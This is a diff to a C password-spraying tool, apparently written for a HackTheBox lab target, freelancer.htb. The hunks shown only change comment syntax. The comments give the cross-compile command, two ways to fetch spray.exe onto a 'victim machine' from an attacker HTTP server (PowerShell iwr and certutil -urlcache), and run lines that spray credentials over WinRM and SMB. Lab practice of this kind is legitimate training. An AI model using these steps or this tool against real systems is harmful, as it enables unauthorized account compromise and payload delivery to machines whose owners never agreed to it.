@@ -1,9 +1,9 @@
-#Pre-requisites
-#Install mingw
-#sudo apt-get update
-#sudo apt-get install mingw-w64
+/*Pre-requisites
+Install mingw
+sudo apt-get update
+sudo apt-get install mingw-w64 */
 
-#Usage: C program to spray known password against all accounts
+//Usage: C program to spray known password against all accounts
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -94,13 +94,15 @@ void spray_smb(const char *target, const char *usernames_file, const char *passw
     fclose(pfile);
 }
 
-#compile
-#x86_64-w64-mingw32-gcc -o spray.exe spray.c -lws2_32
+//compile
+//x86_64-w64-mingw32-gcc -o spray.exe spray.c -lws2_32
 
-#fetch spray.exe onto victim machine using python3 http.server using either of the two methods.
-#(a) iwr http://10.10.14.43:8000/spray.exe -OutFile spray.exe
-#(b) certutil -urlcache -split -f http://10.10.14.43:8000/spray.exe spray.exe
+/*
+fetch spray.exe onto victim machine using python3 http.server using either of the two methods.
+(a) iwr http://10.10.14.43:8000/spray.exe -OutFile spray.exe
+(b) certutil -urlcache -split -f http://10.10.14.43:8000/spray.exe spray.exe
 
-#execute
-#./spray.exe winrm freelancer.htb usernames.list passwords.list
-#./spray.exe smb freelancer.htb usernames.list passwords.list
+//execute
+./spray.exe winrm freelancer.htb usernames.list passwords.list
+./spray.exe smb freelancer.htb usernames.list passwords.list
+*/
